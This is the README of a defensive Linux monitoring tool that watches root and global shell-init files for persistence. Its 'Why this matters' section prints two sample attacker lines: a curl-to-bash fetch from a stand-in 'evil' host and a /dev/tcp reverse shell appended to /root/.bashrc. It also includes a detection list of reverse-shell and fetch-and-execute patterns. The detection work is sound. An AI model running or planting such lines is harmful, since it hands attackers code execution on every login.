# shell-init-watchdog

Boot + daily delta of the global + root shell-init scripts
against a learned baseline, **plus** a suspicious-pattern scan
for command injection. Catches an attacker who appends a payload
to a login script for code-exec on every shell. MITRE
**T1546.004** (Unix Shell Configuration Modification).

## Why this matters

Every interactive login / shell sources these files as the
invoking user (root for a root login). Appending one line:

```
echo 'curl -s http://evil/p | bash &' >> /etc/profile.d/00-lang.sh
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /root/.bashrc
```

gives the attacker execution on every login/shell — a top Linux
persistence technique that needs no service, no cron, no binary
on disk. `ld-preload-watchdog` scans these *same* files but only
for `LD_PRELOAD`/`LD_LIBRARY_PATH`; this watchdog catches
**arbitrary** appended commands (via content delta) and a
curated **suspicious-pattern** set (the high-confidence tier).

## Watched files

Global:
`/etc/profile`, `/etc/bash.bashrc` (Debian) / `/etc/bashrc`
(RHEL), `/etc/profile.d/*.sh` + `*.zsh`, `/etc/zsh/zshrc`,
`/etc/zsh/zprofile`, `/etc/zsh/zshenv`.

Root:
`/root/.bashrc`, `.bash_profile`, `.profile`, `.bash_login`,
`.zshrc`, `.zprofile`.

(Override the set with `SELFDEF_SHELLINIT_FILES`.)

## Profiles

| Profile | Effect |
|---|---|
| `report` (default) | log delta; exit 0 |
| `enforce` | exit 1 on any shell-init change → systemd unit failed → notifier engine |

## Severity ladder

| Condition | Severity | Event |
|---|---|---|
| First scan | `ok` | `baseline_initial` |
| No delta, no suspicious pattern | `ok` | `shell_init_intact` |
| A file hash changed / file added or removed | `warn` | `shell_init_changed` |
| A suspicious command-injection pattern present | `alert` | `shell_init_suspicious_pattern` (the persistence signature) |

## Suspicious patterns

The high-confidence tier flags any watched file containing
(comment-only lines stripped first):

- `curl … | sh` / `wget … | sh` — fetch-and-execute
- `/dev/tcp/` · `/dev/udp/` — bash reverse shell
- `nc -e` / `ncat -e` — netcat exec
- `bash -i` — interactive reverse shell
- `base64 -d` / `--decode` — payload obfuscation
- `eval $(…)` / `eval \`…\`` — dynamic exec
- `python -c` / `perl -e` — interpreter one-liner
- `mkfifo` — named-pipe reverse shell
- `setsid` — detached persistence

These almost never appear in a benign distro shell-init script,
so a hit is alert-grade regardless of the content delta.

## What's recorded

- `file:<path>:<sha12>` — hash of each init file (catches any
  edit, including ones that don't match a known pattern).
- `susp:<path>:<pattern>` — each suspicious pattern present.

## Cadence

`OnBootSec=12min` + `OnCalendar=*-*-* 07:05:00` — extends the
staggered ladder after udev-rules (07:00). The boot catch
matters: a persistence line fires on the next interactive login,
so confirming the set right after a restart is valuable.

## MITRE coverage

- **T1546.004** Event Triggered Execution: Unix Shell
  Configuration Modification — PRIMARY; appending to a login
  script is the canonical instance.
- **T1059.004** Command and Scripting Interpreter: Unix Shell —
  the injected payload is shell command execution.
- **T1037** Boot or Logon Initialization Scripts — login-time
  execution of the modified init script.

## Operator workflow

```bash
# Last scan
journalctl -t selfdef-shell-init -n 1 --no-pager

# Per-change detail
journalctl -t selfdef-shell-init-detail --since "1 day ago"

# Manual inventory of the watched set
for f in /etc/profile /etc/bash.bashrc /etc/profile.d/*.sh \
         /root/.bashrc /root/.bash_profile /root/.profile; do
    [ -f "$f" ] && echo "== $f ==" && cat "$f"
done

# Investigate a suspicious_pattern alert
# - Which file + pattern? journalctl detail shows susp:<file>:<pat>.
grep -nE 'curl.*\| *sh|/dev/tcp|bash -i|base64 -d' <file>
# Remove the injected line, then re-baseline:
sudo sed -i '/curl.*| *bash/d' <file>
sudo rm /var/lib/selfdef/shell-init-baseline.tsv
sudo systemctl start selfdef-shell-init.service

# Re-baseline after a legit edit (you added an env export):
sudo rm /var/lib/selfdef/shell-init-baseline.tsv
sudo systemctl start selfdef-shell-init.service
```

## Caveats

- **Package updates rewrite profile.d files** → benign hash
  change fires `warn`; re-baseline. The `suspicious_pattern`
  tier is the high-confidence one and is delta-independent.
- **Pattern set is a heuristic, not exhaustive.** A novel
  obfuscation may evade it; the content-delta (`warn` on any
  hash change) is the backstop that surfaces every edit for
  operator review. aide-bridge / integrity-sentinel give
  byte-level integrity on the same files.
- **Per-user (non-root) rc files** beyond `/root` are out of
  scope here (root is the high-value target); extend via
  `SELFDEF_SHELLINIT_FILES` for a multi-admin host.
- **Daily+boot cadence** misses an inject-login-revert within
  the window; an audit-rules watch on the init files' writes is
  the real-time complement.

## Coexistence

- **ld-preload-watchdog**: scans the SAME files but only for
  `LD_PRELOAD`/`LD_LIBRARY_PATH`; this covers arbitrary command
  injection. Run both — they cover orthogonal payload shapes in
  one file set.
- **cron-job / systemd-unit / udev-rules watchdogs**: the
  persistence-mechanism family — this adds the login-script
  (T1546.004) surface to the scheduler / service / device-event
  trio.
- **audit-rules**: the real-time complement — writes to the
  init files within the daily window this snapshot misses.
- **aide-bridge / integrity-sentinel**: byte-level integrity on
  the init files; this adds the injection-pattern semantic view.
